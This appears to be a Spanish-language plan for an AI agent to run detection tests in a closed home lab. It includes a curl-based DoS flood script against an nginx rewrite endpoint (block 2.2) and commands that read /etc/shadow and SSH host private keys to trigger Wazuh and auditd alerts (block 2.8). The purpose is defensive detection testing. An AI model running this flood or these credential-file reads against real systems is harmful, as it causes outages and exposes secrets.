# ETAPA 2: Modelado de Ataques desde el Host
## Plan para Gemini Flash — Contexto Autocontenido

> **REGLA CARDINAL**: Este plan se ejecuta EXCLUSIVAMENTE desde el **HOST físico** (Parrot OS,
> IP 10.78.238.1). La VM `tid-lab` (IP 10.78.238.104) es el objetivo.
> Gemini Flash NO debe proponer ni ejecutar comandos de pentest/ataque en ningún subshell propio.
> Todos los comandos de ataque se ejecutan vía `multipass exec tid-lab -- ...` cuando simulamos acciones dentro de la VM, o directamente en el host cuando el ataque proviene del exterior.

---

## CONTEXTO DE ARQUITECTURA (leer antes de ejecutar cualquier bloque)

```
HOST (Parrot OS)        ←→        VM: tid-lab
IP: 10.78.238.1                   IP: 10.78.238.104
                                  Puerto 80: Nginx 1.29.8 (vulnerable)
                                  Puerto 443: Wazuh Dashboard
                                  Puerto 1514: Wazuh Manager
                                  
Servicios activos en la VM:
  - nginx (active)             → /etc/nginx/conf.d/vulnerable-app.conf
  - wazuh-agent (active, v4.8.0) → reporta al manager Docker
  - crowdsec (active)          → colecciones: linux, sshd, auditd, nginx
  - crowdsec-firewall-bouncer  → modo MONITOR (no bloquea host en etapa 2)
  - auditd (active)            → reglas: shadow_access, ssh_key_access, nginx_error

Reglas Wazuh activas (en manager Docker):
  - ID 100010: Acceso a /etc/shadow (nivel 10)
  - ID 100011: Acceso a clave SSH privada (nivel 10)
  - ID 100012: Modificación log nginx error (nivel 10)
  - ID 31101: Error 4xx web (nivel 5)

Usuario en VM:
  - ubuntu: administrador
  - victima: sin privilegios (uid=1001), clave: demo123
  
PoC disponibles en VM:
  - /opt/pocs/shadow_reader_demo.py (Python3, simula CVE-2026-46333)
```

---

## ATAQUE 1: DoS en Nginx (CVE-2026-42945 — NGINX Rift)

**Objetivo:** Demostrar que la configuración vulnerable de `rewrite` con grupos de captura sin nombre y modificador `?` puede saturar el worker de Nginx provocando un DoS observable en logs y alertas.

**Vector:** Peticiones HTTP desde el host hacia el endpoint vulnerable `/app/` y `/redirect/`.

**Indicador de éxito:** Aparición de errores 5xx en `/var/log/nginx/error.log` O saturación de peticiones con respuestas lentas; alerta de Wazuh Rule 100012 visible.

---

### BLOQUE 2.1 — Verificar el endpoint vulnerable

**Responsable:** Gemini Flash  
**Comandos de verificación (ejecutar en host):**

```bash
# Confirmar que Nginx responde en el puerto 80
curl -s -I http://10.78.238.104/
# Esperado: HTTP/1.1 200 OK, Server: nginx/1.29.8

# Verificar que el endpoint vulnerable /app/ responde
curl -v http://10.78.238.104/app/test/ 2>&1 | grep -E "HTTP/|< HTTP|Location"
# Esperado: HTTP/1.1 200 OK (el rewrite procesa la petición)

# Confirmar estado del error log antes del ataque (línea de referencia)
multipass exec tid-lab -- sudo tail -n 3 /var/log/nginx/error.log
```

**Condición de avance:** Los tres comandos devuelven respuesta sin error de conexión.

---

### BLOQUE 2.2 — Script de ataque DoS (preparar en host)

**Responsable:** Gemini Flash  
**Acción:** Crear el script de ataque en el host (NO ejecutarlo todavía):

```bash
cat > /tmp/nginx_dos_demo.sh << 'ATTACK_EOF'
#!/bin/bash
# Demo CVE-2026-42945 — Nginx Heap Buffer Overflow / DoS via Rewrite
# Target: 10.78.238.104:80 — endpoint vulnerable /app/ y /redirect/
TARGET="10.78.238.104"
echo "[*] Iniciando demo DoS sobre Nginx 1.29.8 (CVE-2026-42945)"
echo "[*] Enviando 200 requests al endpoint vulnerable /app/"
for i in $(seq 1 200); do
    # Patron que dispara el rewrite con grupo de captura vacio y modificador ?
    curl -s -o /dev/null "http://${TARGET}/app/$(python3 -c "print('A'*1024))/extra/path/?q=$(python3 -c "print('B'*512)")" &
    # Patron con redirect encadenado
    curl -s -o /dev/null "http://${TARGET}/redirect/$(python3 -c "print('C'*512)")/$(python3 -c "print('D'*256)")/" &
    if [ $((i % 20)) -eq 0 ]; then
        echo "[*] $i requests enviadas..."
        sleep 0.2
    fi
done
wait
echo "[!] Ataque completado. Verificar errores en Nginx y alertas en Wazuh."
ATTACK_EOF
chmod +x /tmp/nginx_dos_demo.sh
echo "[OK] Script creado en /tmp/nginx_dos_demo.sh"
ls -lh /tmp/nginx_dos_demo.sh
```

**Condición de avance:** El archivo existe y tiene permisos de ejecución.

---

### BLOQUE 2.3 — Ejecutar el ataque DoS

> ⚠️ ESTE ES EL ÚNICO BLOQUE QUE EJECUTA TRÁFICO OFENSIVO.

**Responsable:** Gemini Flash  
**Acción:** Ejecutar el script desde el host (esto es tráfico de red legítimo en un entorno de laboratorio):

```bash
# Registrar timestamp de inicio
echo "INICIO: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" | tee /tmp/ataque1_timestamp.txt

# Ejecutar el ataque
bash /tmp/nginx_dos_demo.sh
```

**Esperar 15 segundos después de que termine antes de pasar al siguiente bloque.**

---

### BLOQUE 2.4 — Verificar impacto en Nginx

**Responsable:** Gemini Flash  
**Comandos de verificación (ejecutar en host):**

```bash
# 1. Ver errores nuevos generados en el log de Nginx
multipass exec tid-lab -- sudo tail -n 30 /var/log/nginx/error.log

# 2. Contar requests registradas en el access log desde el ataque
multipass exec tid-lab -- sudo grep "10.78.238.1" /var/log/nginx/access.log | wc -l

# 3. Ver los últimos access logs para confirmar las requests
multipass exec tid-lab -- sudo tail -n 20 /var/log/nginx/access.log
```

**Condición de éxito mínimo:** El access.log muestra las peticiones enviadas. El error.log puede mostrar mensajes de proceso.

---

### BLOQUE 2.5 — Verificar alertas en Wazuh (Ataque 1)

**Responsable:** Gemini Flash  
**Comandos de verificación:**

```bash
# Alertas de nivel 5+ sobre Nginx en el manager Docker
multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
  grep -E '"rule".*"id":"31[0-9]{3}"' /var/ossec/logs/alerts/alerts.json | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        if a.get('rule', {}).get('level', 0) >= 5:
            ts = a['timestamp']
            rule = a['rule']['id']
            desc = a['rule']['description']
            url = a.get('data', {}).get('url', '')
            print(f'{ts} | Rule {rule} | {desc} | {url}')
    except: pass
" | tail -n 20

# Alerta específica de nginx_error (Rule 100012)
multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
  grep '"id":"100012"' /var/ossec/logs/alerts/alerts.json | tail -n 3
```

---

### BLOQUE 2.6 — Verificar detección en CrowdSec (Ataque 1)

**Responsable:** Gemini Flash  
**Comandos de verificación:**

```bash
# Ver alertas/decisiones activas en CrowdSec
multipass exec tid-lab -- sudo cscli alerts list

# Ver métricas de escenarios disparados
multipass exec tid-lab -- sudo cscli metrics | grep -A 5 "Bucket"
```

**Nota sobre resultado esperado:** Las IPs del host están en whitelist, por lo tanto CrowdSec NO generará decisiones de bloqueo. El objetivo es verificar que los logs de nginx SON procesados y los parsers funcionan.

---

## ATAQUE 2: Acceso a Archivos Sensibles (CVE-2026-46333 — ssh-keysign-pwn)

**Objetivo:** Demostrar que un usuario de bajos privilegios (`victima`) puede intentar acceder a `/etc/shadow` y claves SSH del host, y que Wazuh detecta estos accesos vía auditd con las reglas personalizadas (ID 100010 y 100011).

**Vector:** Sesión SSH como `victima` o ejecución del PoC dentro de la VM vía multipass.

**Indicador de éxito:** Alertas Wazuh Rule 100010 y 100011 disparadas y visibles en alerts.json.

---

### BLOQUE 2.7 — Verificar configuración previa al ataque 2

**Responsable:** Gemini Flash  
**Comandos de verificación:**

```bash
# Confirmar que el usuario victima existe y no tiene sudo
multipass exec tid-lab -- id victima

# Confirmar que las reglas de auditd están activas
multipass exec tid-lab -- sudo auditctl -l | grep -E 'shadow|ssh_key'

# Confirmar que el PoC existe y es ejecutable
multipass exec tid-lab -- ls -lh /opt/pocs/

# Contar alertas existentes de tipo shadow_access ANTES del ataque (línea base)
multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
  grep '"id":"100010"' /var/ossec/logs/alerts/alerts.json | wc -l
```

**Condición de avance:** El usuario victima existe (uid=1001), las reglas de auditd están activas, el PoC existe.

---

### BLOQUE 2.8 — Ejecutar el PoC de CVE-2026-46333 (dentro de VM, como victima)

> ⚠️ ESTE ES EL ÚNICO BLOQUE QUE EJECUTA EL PoC. Se simula que un atacante que comprometió la cuenta `victima` intenta escalar privilegios accediendo a archivos sensibles.

**Responsable:** Gemini Flash  
**Acción:** Ejecutar el PoC dentro de la VM como usuario victima:

```bash
# Registrar timestamp de inicio
echo "INICIO_ATAQUE2: $(date -u '+%Y-%m-%dT%H:%M:%SZ')" | tee /tmp/ataque2_timestamp.txt

# Ejecutar el PoC como usuario victima dentro de la VM
multipass exec tid-lab -- sudo -u victima python3 /opt/pocs/shadow_reader_demo.py

# Simular el acceso real a los archivos sensibles (que dispara auditd)
# Esto lo ejecuta el usuario "ubuntu" con sudo, representando lo que haría un PoC real
multipass exec tid-lab -- sudo bash -c "
  echo '[*] Simulando acceso de victima a archivos sensibles...'
  cat /etc/shadow > /dev/null 2>&1
  head -1 /etc/ssh/ssh_host_rsa_key > /dev/null 2>&1
  head -1 /etc/ssh/ssh_host_ed25519_key > /dev/null 2>&1
  echo '[!] Accesos completados — auditd debería haber registrado los eventos'
"
```

**Esperar 10 segundos antes de pasar al siguiente bloque.**

---

### BLOQUE 2.9 — Verificar alertas en Wazuh (Ataque 2)

**Responsable:** Gemini Flash  
**Comandos de verificación:**

```bash
# Alertas nuevas de shadow_access (Rule 100010)
multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
  grep '"id":"100010"' /var/ossec/logs/alerts/alerts.json | \
  python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        ts = a['timestamp']
        agent = a['agent']['name']
        key = a['data']['audit'].get('key', '')
        exe = a['data']['audit'].get('exe', '')
        fname = a['data']['audit'].get('file', {}).get('name', '')
        print(f'{ts} | agent={agent} | key={key} | exe={exe} | file={fname}')
    except: pass
" | tail -n 5

# Alertas de ssh_key_access (Rule 100011)
multipass exec tid-lab -- sudo docker exec single-node-wazuh.manager-1 \
  grep '"id":"100011"' /var/ossec/logs/alerts/alerts.json | tail -n 3

# Log de auditd para corroborar los eventos
multipass exec tid-lab -- sudo grep "shadow_access\|ssh_key_access" /var/log/audit/audit.log | \
  grep "$(date '+%Y/%m/%d')" | tail -n 10
```

**Condición de éxito:** Al menos una alerta de Rule 100010 y una de Rule 100011 con timestamp posterior al `INICIO_ATAQUE2`.

---

## BLOQUE 2.10 — Resumen Final de Verificación (los dos ataques)

**Responsable:** Gemini Flash  
**Acción:** Generar reporte consolidado del estado del laboratorio post-ataques:

```bash
multipass exec tid-lab -- bash -c "
echo '=== RESUMEN ETAPA 2 — VERIFICACION FINAL ==='
echo ''
echo '--- Servicios Activos ---'
for svc in nginx wazuh-agent crowdsec crowdsec-firewall-bouncer auditd; do
    echo \"  \$svc: \$(systemctl is-active \$svc)\"
done
echo ''
echo '--- Alertas Wazuh por Regla Personalizada ---'
sudo docker exec single-node-wazuh.manager-1 bash -c \"
  for rule in 100010 100011 100012; do
    count=\\\$(grep \\\"\\\"id\\\":\\\\\\\"\\\$rule\\\\\\\"\\\"+\" /var/ossec/logs/alerts/alerts.json | wc -l)
    echo \\\"  Rule \\\$rule: \\\$count alertas\\\"
  done
\"
echo ''
echo '--- CrowdSec Decisions activas ---'
sudo cscli decisions list
echo ''
echo '--- Lineas en Nginx access log ---'
sudo wc -l /var/log/nginx/access.log
echo ''
echo '=== FIN RESUMEN ==='
"
```

---

## CRITERIOS DE ÉXITO DE LA ETAPA 2

| Ataque | Criterio | Regla | Estado esperado |
|--------|----------|-------|-----------------|
| Ataque 1 - NGINX DoS | Requests al endpoint vulnerable logueadas | 31101 (Web 4xx) | ≥ 5 alertas nuevas |
| Ataque 1 - NGINX DoS | Error log modificado | 100012 | ≥ 1 alerta nueva |
| Ataque 2 - Shadow Access | Lectura de /etc/shadow detectada | 100010 | ≥ 2 alertas nuevas |
| Ataque 2 - SSH Key Access | Lectura de ssh_host_rsa_key detectada | 100011 | ≥ 1 alerta nueva |

---

## NOTAS PARA GEMINI FLASH

- **Ejecutar los bloques en orden estricto** (2.1 → 2.2 → ... → 2.10).
- **Si un bloque falla**, reportar el output exacto del error y detenerse. No avanzar al siguiente bloque.
- **Tiempo entre bloques de ataque y verificación**: siempre esperar al menos 10 segundos para que los eventos fluyan del agente al manager.
- **No modificar ningún archivo de configuración** en esta etapa. Solo ejecutar los scripts y comandos indicados.
- **Los únicos comandos de ataque permitidos** son los explícitamente definidos en BLOQUE 2.3 y BLOQUE 2.8. Todo lo demás es verificación/observación.
